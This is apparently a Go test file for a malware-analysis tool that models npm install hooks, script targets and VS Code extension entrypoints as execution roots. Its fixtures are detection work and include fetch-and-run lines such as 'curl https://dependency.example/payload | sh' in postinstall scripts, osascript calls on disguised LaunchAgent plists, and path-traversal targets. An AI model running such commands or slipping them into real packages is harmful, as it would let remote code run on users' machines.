package extract

import (
	"fmt"
	"math/rand"
	"slices"
	"strings"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestPackageJSONBrowserOnlyMaterializesStringForm(t *testing.T) {
	for _, test := range []struct {
		name    string
		browser string
		want    string
	}{
		{name: "string", browser: `"dist/web.js"`, want: "dist/web.js"},
		{name: "mapping", browser: `{"./node.js":"./web.js"}`},
		{name: "array", browser: `[{}, {}, {}]`},
	} {
		t.Run(test.name, func(t *testing.T) {
			content := artifact.Content{NodeID: "node-1", LogicalPath: "package.json", Data: []byte(`{"browser":` + test.browser + `}`)}
			var graph behavior.Graph
			pkg, ok := decodePackageJSON(&graph, content)
			if !ok {
				t.Fatalf("decode failed: %#v", graph.Coverage)
			}
			if got := string(pkg.Browser); got != test.want {
				t.Fatalf("browser = %q, want %q", got, test.want)
			}
		})
	}
}

func TestPackageJSONPreflightRejectsContainerAmplification(t *testing.T) {
	data := []byte(`{"browser":[` + strings.Repeat(`{},`, maxPackageJSONTokens/2) + `null]}`)
	content := artifact.Content{NodeID: "node-1", LogicalPath: "package.json", Data: data}
	var graph behavior.Graph
	if _, ok := decodePackageJSON(&graph, content); ok {
		t.Fatal("token-dense package manifest should be rejected")
	}
	if len(graph.Coverage) != 1 || !strings.Contains(graph.Coverage[0].Detail, "JSON token limit") {
		t.Fatalf("missing explicit token-limit coverage: %#v", graph.Coverage)
	}
}

func TestPackageJSONUsesExactExecutionKeyCasing(t *testing.T) {
	for _, data := range []string{
		`{"Scripts":{"install":"echo decoy"},"scripts":{"install":"echo runtime"},"Main":"decoy.js","main":"runtime.js"}`,
		`{"scripts":{"install":"echo runtime"},"Scripts":{"install":"echo decoy"},"main":"runtime.js","Main":"decoy.js"}`,
	} {
		pkg, err := decodePackageJSONObject([]byte(data))
		if err != nil {
			t.Fatal(err)
		}
		if pkg.Scripts["install"] != "echo runtime" || pkg.Main != "runtime.js" {
			t.Fatalf("case-folded keys redirected package metadata: %+v", pkg)
		}
	}

	pkg, err := decodePackageJSONObject([]byte(`{"Scripts":{"install":"echo ignored"},"Main":"ignored.js"}`))
	if err != nil {
		t.Fatal(err)
	}
	if len(pkg.Scripts) != 0 || pkg.Main != "" {
		t.Fatalf("noncanonical package keys were accepted: %+v", pkg)
	}
}

func TestPackageDependencyFeaturesRetainExactDeclarations(t *testing.T) {
	var graph behavior.Graph
	ExtractPackageHooks(&graph, artifact.Content{
		NodeID:      "node-package",
		LogicalPath: "package.json",
		Data: []byte(`{
  "Dependencies":{"ignored":"9.9.9"},
  "dependencies":{"z-runtime":"git+https://example.invalid/z.git#commit","@scope/runtime":"npm:replacement@1.2.3"},
  "devDependencies":{"build-only":"file:../build-only"},
  "optionalDependencies":{"optional-native":"^4.5.6"},
  "peerDependencies":{"host-api":">=7"}
}`),
	})

	want := []struct {
		name, section, specifier string
	}{
		{name: "@scope/runtime", section: "dependencies", specifier: "npm:replacement@1.2.3"},
		{name: "z-runtime", section: "dependencies", specifier: "git+https://example.invalid/z.git#commit"},
		{name: "build-only", section: "devDependencies", specifier: "file:../build-only"},
		{name: "optional-native", section: "optionalDependencies", specifier: "^4.5.6"},
		{name: "host-api", section: "peerDependencies", specifier: ">=7"},
	}
	if len(graph.Features) != len(want) {
		t.Fatalf("dependency features = %d, want %d: %#v", len(graph.Features), len(want), graph.Features)
	}
	evidenceByID := make(map[string]behavior.Evidence, len(graph.Evidence))
	for _, evidence := range graph.Evidence {
		evidenceByID[evidence.ID] = evidence
	}
	for i, expected := range want {
		feature := graph.Features[i]
		if feature.Key != "package.dependency" || feature.Value != expected.name || feature.Qualifiers["section"] != expected.section || feature.Qualifiers["specifier"] != expected.specifier {
			t.Fatalf("dependency feature %d = %#v, want %+v", i, feature, expected)
		}
		if feature.Execution.Connectivity != behavior.ConnectivityUnknown || len(feature.Execution.ExecutionRootIDs) != 0 || len(feature.EvidenceIDs) != 1 {
			t.Fatalf("dependency declaration gained execution ownership or lost evidence: %#v", feature)
		}
		evidence := evidenceByID[feature.EvidenceIDs[0]]
		if evidence.Kind != "package-dependency" || !strings.Contains(evidence.Value, expected.section+": "+expected.name+"@"+expected.specifier) {
			t.Fatalf("dependency evidence = %#v, want exact declaration", evidence)
		}
	}
}

func TestPackageDependencyFeaturesAreBounded(t *testing.T) {
	var manifest strings.Builder
	manifest.WriteString(`{"dependencies":{`)
	for i := 0; i < maxPackageDependencyFacts+2; i++ {
		if i > 0 {
			manifest.WriteByte(',')
		}
		fmt.Fprintf(&manifest, `"dependency-%05d":"1.0.0"`, i)
	}
	manifest.WriteString(`}}`)

	var graph behavior.Graph
	ExtractPackageHooks(&graph, artifact.Content{NodeID: "node-package", LogicalPath: "package.json", Data: []byte(manifest.String())})

	if len(graph.Features) != maxPackageDependencyFacts || len(graph.Evidence) != maxPackageDependencyFacts {
		t.Fatalf("dependency inventory exceeded or failed before its bound: features=%d evidence=%d", len(graph.Features), len(graph.Evidence))
	}
	if !hasPartialCoverageScope(graph.Coverage, "package-dependency-inventory") {
		t.Fatalf("bounded dependency inventory omitted no coverage: %#v", graph.Coverage)
	}
}

func TestMalformedPackageDependencyMapFailsClosed(t *testing.T) {
	var graph behavior.Graph
	ExtractPackageHooks(&graph, artifact.Content{
		NodeID:      "node-package",
		LogicalPath: "package.json",
		Data:        []byte(`{"dependencies":{"valid":"1.0.0","malformed":{"version":"2.0.0"}},"scripts":{"postinstall":"echo should-not-run"}}`),
	})

	if len(graph.Features) != 0 || len(graph.ExecutionRoots) != 0 {
		t.Fatalf("malformed dependency map produced partial manifest semantics: features=%#v roots=%#v", graph.Features, graph.ExecutionRoots)
	}
	if !hasPartialCoverageScope(graph.Coverage, "package-json") {
		t.Fatalf("malformed dependency map omitted decode coverage: %#v", graph.Coverage)
	}
}

func TestPackageScriptFeaturesKeepExactExecutionOwnership(t *testing.T) {
	var graph behavior.Graph
	content := artifact.Content{
		NodeID:      "node-package",
		LogicalPath: "package.json",
		Data:        []byte(`{"scripts":{"postinstall":"echo install","test":"curl https://not-install.example/p | sh"},"dependencies":{"runtime":"1.0.0"}}`),
	}
	ExtractPackageHooks(&graph, content)
	if len(graph.ExecutionRoots) != 1 {
		t.Fatalf("lifecycle root count = %d, want 1: %#v", len(graph.ExecutionRoots), graph.ExecutionRoots)
	}

	execution := connectedExecutionContext([]string{graph.ExecutionRoots[0].ID}, nil)
	promoteNodeExecution(&graph, map[string]behavior.ExecutionContext{content.NodeID: execution})
	for _, feature := range graph.Features {
		switch {
		case feature.Key == "package.script" && feature.Qualifiers["name"] == "postinstall":
			if feature.Execution.Connectivity != behavior.ConnectivityConnected || len(feature.Execution.ExecutionRootIDs) != 1 {
				t.Fatalf("lifecycle declaration lost its exact root: %#v", feature)
			}
		case feature.Key == "package.script" && feature.Qualifiers["name"] == "test":
			if feature.Execution.Connectivity != behavior.ConnectivityUnknown {
				t.Fatalf("unrelated script inherited lifecycle execution: %#v", feature)
			}
		case feature.Key == "package.dependency":
			if feature.Execution.Connectivity != behavior.ConnectivityUnknown {
				t.Fatalf("dependency declaration inherited lifecycle execution: %#v", feature)
			}
		}
	}
}

func TestLocalScriptTargetsUnwrapsCommandWrappers(t *testing.T) {
	got := localScriptTargets(`sudo -E sh scripts/install.sh && env NODE_ENV=production node --require ./scripts/preload.js scripts/setup.js && command python scripts/configure.py && deno run --allow-net scripts/deno.js`)
	want := []string{"./scripts/preload.js", "scripts/configure.py", "scripts/deno.js", "scripts/install.sh", "scripts/setup.js"}
	assertStringSlice(t, got, want)
}

func TestLocalScriptTargetsSkipsLeadingAssignmentsAndInterpreterOptions(t *testing.T) {
	got := localScriptTargets(`NODE_ENV=production node scripts/install.js && bash --rcfile ./fixture.rc -O extglob scripts/postinstall.sh && sudo FOO=bar python scripts/configure.py`)
	want := []string{"scripts/configure.py", "scripts/install.js", "scripts/postinstall.sh"}
	assertStringSlice(t, got, want)
}

func TestLocalScriptTargetsIgnoresNodePreloadPackageSpecifiers(t *testing.T) {
	got := localScriptTargets(`node --require ts-node/register --loader ts-node/esm scripts/setup.js`)
	want := []string{"scripts/setup.js"}
	assertStringSlice(t, got, want)
}

func TestLocalScriptTargetsRecognizesDisguisedOSAScriptFile(t *testing.T) {
	got := localScriptTargets(`osascript -l AppleScript com.apple.4V.plist && osascript ~/Library/LaunchAgents/com.apple.runtime.plist && osascript -e 'display dialog "decoy"' ignored.plist && osascript ../escape.plist && osascript ~/Library/LaunchAgents/../escape.plist`)
	want := []string{"com.apple.4V.plist", "~/Library/LaunchAgents/com.apple.runtime.plist"}
	assertStringSlice(t, got, want)
}

func TestPackageScriptReferences(t *testing.T) {
	got := packageScriptReferences(`npm run setup && pnpm run postinstall && yarn run build && bun run prepare`)
	want := []string{"build", "postinstall", "prepare", "setup"}
	assertStringSlice(t, got, want)
}

func TestPackageScriptReferencesRejectsDynamicAndImplicitNames(t *testing.T) {
	for _, command := range []string{
		`npm run "$SCRIPT"`,
		`npm run ./scripts/install.js`,
		`yarn build`,
		`node scripts/install.js`,
	} {
		if got := packageScriptReferences(command); len(got) != 0 {
			t.Fatalf("%q resolved unsafe package script references: %#v", command, got)
		}
	}
}

func TestInstallLifecycleEntrypointScriptsMatchNPMInstallSequence(t *testing.T) {
	for _, name := range []string{"preinstall", "install", "postinstall", "prepublish", "preprepare", "prepare", "postprepare"} {
		if !isLifecycleEntrypointScript(name) {
			t.Errorf("%q should be modeled as an install lifecycle entrypoint", name)
		}
	}
	for _, name := range []string{"prepack", "pack", "publish", "test"} {
		if isLifecycleEntrypointScript(name) {
			t.Errorf("%q should not be modeled as an install lifecycle entrypoint", name)
		}
	}
}

func TestPackageScriptsCannotExecuteFromDependenciesOrAppBundles(t *testing.T) {
	for _, logical := range []string{
		"node_modules/dep/package.json",
		"sample.zip!node_modules/dep/package.json",
		"sample.zip!Example.app/Contents/Resources/package.json",
	} {
		if packageScriptsCanExecuteAtInstall(logical) {
			t.Fatalf("packageScriptsCanExecuteAtInstall(%q) = true", logical)
		}
	}
	if !packageScriptsCanExecuteAtInstall("sample.zip!package.json") {
		t.Fatal("top-level archived package should retain lifecycle execution roots")
	}
}

func TestResolveSiblingLogicalPreservesVirtualContainerBoundary(t *testing.T) {
	for _, test := range []struct {
		parent string
		target string
		want   string
	}{
		{parent: "package.json", target: "scripts/install.js", want: "scripts/install.js"},
		{parent: "sample.zip!package.json", target: "scripts/install.js", want: "sample.zip!scripts/install.js"},
		{parent: "sample.zip!app/package.json", target: "scripts/install.js", want: "sample.zip!app/scripts/install.js"},
		{parent: "sample.pkg!Payload!package.json", target: "scripts/install.js", want: "sample.pkg!Payload!scripts/install.js"},
		{parent: "sample.pkg!Payload!Library/LaunchAgents/agent.plist", target: "com.apple.4V.plist", want: "sample.pkg!Payload!Library/LaunchAgents/com.apple.4V.plist"},
	} {
		got, ok := resolveSiblingLogical(test.parent, test.target)
		if !ok || got != test.want {
			t.Fatalf("resolveSiblingLogical(%q, %q) = %q, %v; want %q, true", test.parent, test.target, got, ok, test.want)
		}
	}
}

func TestResolveSiblingLogicalRejectsDynamicAndEscapingTargets(t *testing.T) {
	for _, target := range []string{
		"../outside.plist",
		"$PAYLOAD",
		"resources/${PAYLOAD}.plist",
		"https://example.invalid/payload",
		"nested.pkg!payload.plist",
		"/tmp/payload.plist",
	} {
		if got, ok := resolveSiblingLogical("sample.pkg!Payload!Library/LaunchAgents/agent.plist", target); ok {
			t.Fatalf("resolveSiblingLogical accepted %q as %q", target, got)
		}
	}
}

func TestArchivedDependencyLifecycleScriptIsInventoryOnly(t *testing.T) {
	var graph behavior.Graph
	ExtractPackageHooks(&graph, artifact.Content{
		NodeID:      "node-0001",
		LogicalPath: "sample.zip!node_modules/dep/package.json",
		Role:        "vendor",
		Data:        []byte(`{"scripts":{"postinstall":"curl https://dependency.example/payload | sh"}}`),
	})

	if len(graph.Features) != 1 || graph.Features[0].Key != "package.script" {
		t.Fatalf("dependency script inventory missing: %#v", graph.Features)
	}
	if len(graph.ExecutionRoots) != 0 || len(graph.Operations) != 0 || len(graph.Network) != 0 || hasOperationFlowRelation(graph.Relations) {
		t.Fatalf("dependency lifecycle script became executable behavior: roots=%#v operations=%#v network=%#v chains=%#v", graph.ExecutionRoots, graph.Operations, graph.Network, graph.Relations)
	}
}

func TestIneligiblePackagedDeclarationsRetainFeaturesWithoutRoots(t *testing.T) {
	t.Run("npm lifecycle", func(t *testing.T) {
		var graph behavior.Graph
		ExtractPackageHooks(&graph, artifact.Content{
			NodeID:                        "node-package",
			LogicalPath:                   "carrier!carchive!payload/package.json",
			Data:                          []byte(`{"scripts":{"postinstall":"curl https://packaged.example/payload | sh"}}`),
			ExecutionRootEligibilityKnown: true,
			ExecutionRootEligible:         false,
		})
		if len(graph.Features) != 1 || graph.Features[0].Key != "package.script" {
			t.Fatalf("packaged lifecycle declaration feature missing: %#v", graph.Features)
		}
		if len(graph.ExecutionRoots) != 0 || len(graph.Operations) != 0 {
			t.Fatalf("ineligible lifecycle declaration became a root: roots=%#v operations=%#v", graph.ExecutionRoots, graph.Operations)
		}
	})

	t.Run("python console script", func(t *testing.T) {
		var graph behavior.Graph
		ExtractPackageHooks(&graph, artifact.Content{
			NodeID:                        "node-entry-points",
			LogicalPath:                   "carrier!carchive!payload/entry_points.txt",
			Data:                          []byte("[console_scripts]\ndemo = pkg.module:main\n"),
			ExecutionRootEligibilityKnown: true,
			ExecutionRootEligible:         false,
		})
		if len(graph.Evidence) == 0 {
			t.Fatal("packaged Python entrypoint declaration lost its evidence")
		}
		if len(graph.ExecutionRoots) != 0 {
			t.Fatalf("ineligible Python declaration became a root: %#v", graph.ExecutionRoots)
		}
	})

	t.Run("VS Code extension", func(t *testing.T) {
		graph := behavior.Graph{Operations: []behavior.ModeledOperation{{SubjectNodeID: "node-extension", Execution: unknownExecutionContext()}}}
		contents := []artifact.Content{
			{
				NodeID:                        "node-package",
				LogicalPath:                   "carrier!carchive!extension/package.json",
				Data:                          []byte(`{"name":"demo","main":"dist/extension.js","engines":{"vscode":"*"}}`),
				ExecutionRootEligibilityKnown: true,
				ExecutionRootEligible:         false,
			},
			{NodeID: "node-extension", LogicalPath: "carrier!carchive!extension/dist/extension.js", ExecutionRootEligibilityKnown: true, ExecutionRootEligible: false},
		}
		ResolveVSCodeExtensionEntrypoints(&graph, contents)
		if len(graph.Features) != 1 || graph.Features[0].Key != "vscode.extension.entrypoint" {
			t.Fatalf("packaged VS Code declaration feature missing: %#v", graph.Features)
		}
		if len(graph.ExecutionRoots) != 0 || graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown {
			t.Fatalf("ineligible VS Code declaration gained root context: roots=%#v operation=%#v", graph.ExecutionRoots, graph.Operations[0])
		}
	})
}

func TestResolvePackageScriptTargetsIndexesLargePromotionProduct(t *testing.T) {
	const (
		targetCount         = 3000
		operationsPerTarget = 4
	)
	var command strings.Builder
	contents := make([]artifact.Content, 0, targetCount+1)
	var graph behavior.Graph
	graph.ExecutionRoots = append(graph.ExecutionRoots, behavior.ExecutionRoot{
		ID:                "root-install",
		DeclarationNodeID: "node-package",
		StartNodeID:       "node-package",
		Kind:              "npm-script",
		Name:              "install",
	})
	for i := 0; i < targetCount; i++ {
		if i > 0 {
			command.WriteByte(';')
		}
		fmt.Fprintf(&command, "./f%05d.js", i)
		nodeID := fmt.Sprintf("node-target-%05d", i)
		contents = append(contents, artifact.Content{
			NodeID:      nodeID,
			LogicalPath: fmt.Sprintf("pkg/f%05d.js", i),
		})
		for j := 0; j < operationsPerTarget; j++ {
			graph.Operations = append(graph.Operations, behavior.ModeledOperation{SubjectNodeID: nodeID, Execution: unknownExecutionContext()})
		}
	}
	contents = append(contents, artifact.Content{
		NodeID:      "node-package",
		LogicalPath: "pkg/package.json",
		Data:        []byte(fmt.Sprintf(`{"scripts":{"install":%q}}`, command.String())),
	})

	ResolvePackageScriptTargets(&graph, contents)

	for i, operation := range graph.Operations {
		if operation.Execution.Connectivity != behavior.ConnectivityConnected || len(operation.Execution.ExecutionRootIDs) != 1 || operation.Execution.ExecutionRootIDs[0] != "root-install" || len(operation.Execution.InvokedTargetIDs) != 1 {
			t.Fatalf("operation %d was not soundly promoted: %#v", i, operation)
		}
	}
	if got, want := len(graph.InvokedTargets), targetCount; got != want {
		t.Fatalf("invoked targets = %d, want %d", got, want)
	}
	if got, want := len(graph.Evidence), targetCount; got != want {
		t.Fatalf("evidence = %d, want %d", got, want)
	}
}

func TestResolvePackageScriptTargetsPromotesOnlyResolvedStartScope(t *testing.T) {
	graph := behavior.Graph{
		ExecutionRoots: []behavior.ExecutionRoot{{
			ID:                "root-install",
			DeclarationNodeID: "node-package",
			StartNodeID:       "node-package",
			Kind:              "npm-script",
			Name:              "install",
		}},
		Operations: []behavior.ModeledOperation{
			{SubjectNodeID: "node-target", ScopeID: "scope-module", Execution: unknownExecutionContext()},
			{SubjectNodeID: "node-target", ScopeID: "scope-called", SourceFunction: "called", Execution: unknownExecutionContext()},
			{SubjectNodeID: "node-target", ScopeID: "scope-dormant", SourceFunction: "dormant", Execution: unknownExecutionContext()},
			{SubjectNodeID: "node-target", ScopeID: "scope-nested", Execution: unknownExecutionContext()},
		},
	}
	contents := []artifact.Content{
		{NodeID: "node-package", LogicalPath: "pkg/package.json", Data: []byte(`{"scripts":{"install":"python target.py"}}`)},
		{NodeID: "node-target", ScopeID: "scope-module", LogicalPath: "pkg/target.py"},
	}

	ResolvePackageScriptTargets(&graph, contents)

	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityConnected {
		t.Fatalf("resolved module scope was not promoted: %#v", graph.Operations)
	}
	for _, index := range []int{1, 2, 3} {
		if graph.Operations[index].Execution.Connectivity != behavior.ConnectivityUnknown {
			t.Fatalf("non-start scope operation %d inherited node-wide execution: %#v", index, graph.Operations[index])
		}
	}
}

func TestResolvePackageScriptTargetsStopsAtDerivedWorkLimit(t *testing.T) {
	graph := behavior.Graph{
		ExecutionRoots: []behavior.ExecutionRoot{{
			ID:                "root-install",
			DeclarationNodeID: "node-package",
			StartNodeID:       "node-package",
			Kind:              "npm-script",
			Name:              "install",
		}},
		Operations: []behavior.ModeledOperation{
			{SubjectNodeID: "node-b", Execution: unknownExecutionContext()},
			{SubjectNodeID: "node-c", Execution: unknownExecutionContext()},
		},
	}
	contents := []artifact.Content{
		{NodeID: "node-package", LogicalPath: "pkg/package.json", Data: []byte(`{"scripts":{"install":"./b.js;./c.js"}}`)},
		{NodeID: "node-b", LogicalPath: "pkg/b.js"},
		{NodeID: "node-c", LogicalPath: "pkg/c.js"},
	}

	resolvePackageScriptTargets(&graph, contents, 2)

	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityConnected {
		t.Fatalf("bounded resolver did not retain its deterministic promoted prefix: %#v", graph.Operations)
	}
	if graph.Operations[1].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("resolver exceeded its derived-work budget: %#v", graph.Operations)
	}
	if !hasPartialCoverageScope(graph.Coverage, "package-script-target-resolution") {
		t.Fatalf("package target truncation was not visible: %#v", graph.Coverage)
	}
	for _, target := range graph.InvokedTargets {
		if target.ID == "" || len(target.EvidenceIDs) != 1 || target.EvidenceIDs[0] == "" {
			t.Fatalf("invoked target retained empty provenance: %#v", target)
		}
	}
}

func TestPromoteIndexedNodeOperationsBoundsScopeFilteringDeterministically(t *testing.T) {
	for trial := 0; trial < 3; trial++ {
		graph := behavior.Graph{Operations: []behavior.ModeledOperation{
			{SubjectNodeID: "node-target", ScopeID: "scope-module", Execution: unknownExecutionContext()},
			{SubjectNodeID: "node-target", ScopeID: "scope-function", SourceFunction: "dormant", Execution: unknownExecutionContext()},
			{SubjectNodeID: "node-target", ScopeID: "scope-module", Execution: unknownExecutionContext()},
		}}
		work := newDerivedWorkBudget(2)
		complete := promoteIndexedNodeOperations(
			&graph,
			[]int{0, 1, 2},
			"scope-module",
			testConnectedExecution("root-entry"),
			&work,
			2,
			"entrypoint-test",
			"entrypoint operation candidates",
		)

		if complete {
			t.Fatal("promotion exceeded its candidate-work budget")
		}
		if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityConnected ||
			graph.Operations[1].Execution.Connectivity != behavior.ConnectivityUnknown ||
			graph.Operations[2].Execution.Connectivity != behavior.ConnectivityUnknown {
			t.Fatalf("trial %d produced a non-deterministic bounded prefix: %#v", trial, graph.Operations)
		}
		if !hasPartialCoverageScope(graph.Coverage, "entrypoint-test") {
			t.Fatalf("trial %d omitted bounded-work coverage: %#v", trial, graph.Coverage)
		}
	}
}

func TestResolvePackageScriptTargetsRequiresNPMEntrypoint(t *testing.T) {
	graph := behavior.Graph{Operations: []behavior.ModeledOperation{{
		SubjectNodeID: "node-target",
		Execution:     unknownExecutionContext(),
	}}}
	contents := []artifact.Content{
		{NodeID: "node-package", LogicalPath: "pkg/package.json", Data: []byte(`{"scripts":{"install":"./target.js"}}`)},
		{NodeID: "node-target", LogicalPath: "pkg/target.js"},
	}

	ResolvePackageScriptTargets(&graph, contents)

	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("target was promoted without a retained npm execution root: %#v", graph.Operations[0])
	}
	if len(graph.Evidence) != 0 || len(graph.InvokedTargets) != 0 {
		t.Fatalf("resolver emitted orphan provenance without a root: evidence=%#v targets=%#v", graph.Evidence, graph.InvokedTargets)
	}
}

func TestResolvePackageScriptTargetsReportsMissingConcreteTarget(t *testing.T) {
	graph := behavior.Graph{ExecutionRoots: []behavior.ExecutionRoot{{
		ID:                "root-install",
		DeclarationNodeID: "node-package",
		StartNodeID:       "node-package",
		Kind:              "npm-script",
		Name:              "postinstall",
	}}}
	contents := []artifact.Content{{
		NodeID:      "node-package",
		LogicalPath: "pkg/package.json",
		Data:        []byte(`{"scripts":{"postinstall":"node setup.js"}}`),
	}}

	ResolvePackageScriptTargets(&graph, contents)

	if len(graph.InvokedTargets) != 0 {
		t.Fatalf("absent script became an invoked target: %#v", graph.InvokedTargets)
	}
	if !hasPartialCoverageScope(graph.Coverage, "package-script-target-resolution") {
		t.Fatalf("missing concrete target omitted partial coverage: %#v", graph.Coverage)
	}
}

func TestResolvePackageScriptTargetsDoesNotInventMissingDynamicTarget(t *testing.T) {
	graph := behavior.Graph{ExecutionRoots: []behavior.ExecutionRoot{{
		ID:                "root-install",
		DeclarationNodeID: "node-package",
		StartNodeID:       "node-package",
		Kind:              "npm-script",
		Name:              "postinstall",
	}}}
	contents := []artifact.Content{{
		NodeID:      "node-package",
		LogicalPath: "pkg/package.json",
		Data:        []byte(`{"scripts":{"postinstall":"node \"$TARGET\""}}`),
	}}

	ResolvePackageScriptTargets(&graph, contents)

	if hasPartialCoverageScope(graph.Coverage, "package-script-target-resolution") {
		t.Fatalf("dynamic target was misrepresented as a missing concrete file: %#v", graph.Coverage)
	}
}

func TestResolveVSCodeExtensionEntrypointPromotesIndexedOperations(t *testing.T) {
	graph := behavior.Graph{Operations: []behavior.ModeledOperation{{
		SubjectNodeID: "node-extension",
		Execution:     unknownExecutionContext(),
	}}}
	contents := []artifact.Content{
		{
			NodeID:      "node-package",
			LogicalPath: "extension/package.json",
			Data:        []byte(`{"name":"demo","main":"dist/extension.js","engines":{"vscode":"^1.90.0"}}`),
		},
		{NodeID: "node-extension", LogicalPath: "extension/dist/extension.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)

	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].ID == "" || len(graph.ExecutionRoots[0].EvidenceIDs) != 2 || graph.ExecutionRoots[0].EvidenceIDs[0] == "" || graph.ExecutionRoots[0].EvidenceIDs[1] == "" {
		t.Fatalf("VS Code execution root is missing provenance: %#v", graph.ExecutionRoots)
	}
	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityConnected || len(graph.Operations[0].Execution.ExecutionRootIDs) != 1 || graph.Operations[0].Execution.ExecutionRootIDs[0] != graph.ExecutionRoots[0].ID {
		t.Fatalf("VS Code target operation was not promoted: %#v", graph.Operations[0])
	}
}

func TestResolveVSCodeExtensionEntrypointPromotesOnlyStartScope(t *testing.T) {
	graph := behavior.Graph{Operations: []behavior.ModeledOperation{
		{SubjectNodeID: "node-extension", ScopeID: "scope-module", Execution: unknownExecutionContext()},
		{SubjectNodeID: "node-extension", ScopeID: "scope-activate", SourceFunction: "activate", Execution: unknownExecutionContext()},
		{SubjectNodeID: "node-extension", ScopeID: "scope-nested", Execution: unknownExecutionContext()},
	}}
	contents := []artifact.Content{
		{
			NodeID:      "node-package",
			LogicalPath: "extension/package.json",
			Data:        []byte(`{"name":"demo","main":"dist/extension.js","engines":{"vscode":"^1.90.0"}}`),
		},
		{NodeID: "node-extension", ScopeID: "scope-module", LogicalPath: "extension/dist/extension.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)

	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityConnected {
		t.Fatalf("resolved module scope was not promoted: %#v", graph.Operations)
	}
	for _, index := range []int{1, 2} {
		if graph.Operations[index].Execution.Connectivity != behavior.ConnectivityUnknown {
			t.Fatalf("non-start scope operation %d inherited VS Code node execution: %#v", index, graph.Operations[index])
		}
	}
}

func TestVSCodeExtensionlessMainFallsBackToJavaScript(t *testing.T) {
	graph := behavior.Graph{Operations: []behavior.ModeledOperation{{
		SubjectNodeID: "node-extension",
		Kind:          behavior.OperationProcessExecute,
		Execution:     unknownExecutionContext(),
	}}}
	contents := []artifact.Content{
		{NodeID: "node-package", LogicalPath: "sample.vsix!extension/package.json", Data: []byte(`{"name":"demo","main":"./dist/extension","engines":{"vscode":"*"}}`)},
		{NodeID: "node-extension", LogicalPath: "sample.vsix!extension/dist/extension.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)

	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].StartNodeID != "node-extension" ||
		len(graph.ExecutionRoots[0].Arguments) != 1 || graph.ExecutionRoots[0].Arguments[0] != "sample.vsix!extension/dist/extension.js" {
		t.Fatalf("extensionless main did not resolve to its retained JavaScript target: %#v", graph.ExecutionRoots)
	}
	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityConnected {
		t.Fatalf("resolved JavaScript target did not gain root ownership: %#v", graph.Operations[0])
	}
	if len(graph.Features) != 1 || graph.Features[0].Value != "./dist/extension" {
		t.Fatalf("resolved target replaced the exact manifest declaration: %#v", graph.Features)
	}
}

func TestVSCodeExtensionlessMainPrefersExactFile(t *testing.T) {
	graph := behavior.Graph{Operations: []behavior.ModeledOperation{
		{SubjectNodeID: "node-exact", Kind: behavior.OperationNetworkConnect, Execution: unknownExecutionContext()},
		{SubjectNodeID: "node-js", Kind: behavior.OperationNetworkConnect, Execution: unknownExecutionContext()},
	}}
	contents := []artifact.Content{
		{NodeID: "node-package", LogicalPath: "extension/package.json", Data: []byte(`{"main":"dist/extension","engines":{"vscode":"*"}}`)},
		{NodeID: "node-exact", LogicalPath: "extension/dist/extension"},
		{NodeID: "node-js", LogicalPath: "extension/dist/extension.js"},
	}

	ResolveVSCodeExtensionEntrypoints(&graph, contents)

	if len(graph.ExecutionRoots) != 1 || graph.ExecutionRoots[0].StartNodeID != "node-exact" {
		t.Fatalf("exact entrypoint did not win over the .js fallback: %#v", graph.ExecutionRoots)
	}
	if graph.Operations[0].Execution.Connectivity != behavior.ConnectivityConnected ||
		graph.Operations[1].Execution.Connectivity != behavior.ConnectivityUnknown {
		t.Fatalf("entrypoint precedence promoted the wrong operation: %#v", graph.Operations)
	}
}

func TestVSCodeEntrypointResolutionFailsClosed(t *testing.T) {
	tests := []struct {
		name       string
		main       string
		targetPath string
		wantDetail string
	}{
		{name: "explicit extension", main: "dist/extension.cjs", targetPath: "extension/dist/extension.cjs.js", wantDetail: vscodeEntrypointMissingCoverage},
		{name: "directory", main: "dist/extension/", targetPath: "extension/dist/extension/index.js", wantDetail: vscodeEntrypointDirectoryCoverage},
		{name: "traversal", main: "../escape.js", targetPath: "escape.js", wantDetail: vscodeEntrypointUnsafeCoverage},
		{name: "absolute", main: "/tmp/escape.js", targetPath: "tmp/escape.js", wantDetail: vscodeEntrypointUnsafeCoverage},
		{name: "URL", main: "https://example.invalid/escape.js", targetPath: "extension/escape.js", wantDetail: vscodeEntrypointUnsafeCoverage},
		{name: "virtual boundary", main: "outer!escape.js", targetPath: "extension/escape.js", wantDetail: vscodeEntrypointUnsafeCoverage},
		{name: "variable", main: "$TARGET", targetPath: "extension/target.js", wantDetail: vscodeEntrypointUnsafeCoverage},
		{name: "glob", main: "dist/*.js", targetPath: "extension/dist/entry.js", wantDetail: vscodeEntrypointUnsafeCoverage},
		{name: "overlong", main: strings.Repeat("a", artifact.MaxArchiveNameBytes+1), targetPath: "extension/entry.js", wantDetail: vscodeEntrypointUnsafeCoverage},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			contents := []artifact.Content{
				{NodeID: "node-package", LogicalPath: "extension/package.json", Data: []byte(fmt.Sprintf(`{"main":%q,"engines":{"vscode":"*"}}`, test.main))},
				{NodeID: "node-decoy", LogicalPath: test.targetPath},
			}

			ResolveVSCodeExtensionEntrypoints(&graph, contents)

			if len(graph.ExecutionRoots) != 0 {
				t.Fatalf("unsupported entrypoint produced a root: %#v", graph.ExecutionRoots)
			}
			if len(graph.Features) != 1 || graph.Features[0].Value != test.main || len(graph.Features[0].EvidenceIDs) != 1 {
				t.Fatalf("direct declaration was not retained independently: %#v", graph.Features)
			}
			if countCoverageDetail(graph.Coverage, "vscode-entrypoint-resolution", test.wantDetail) != 1 {
				t.Fatalf("stable resolution coverage missing: %#v", graph.Coverage)
			}
		})
	}
}

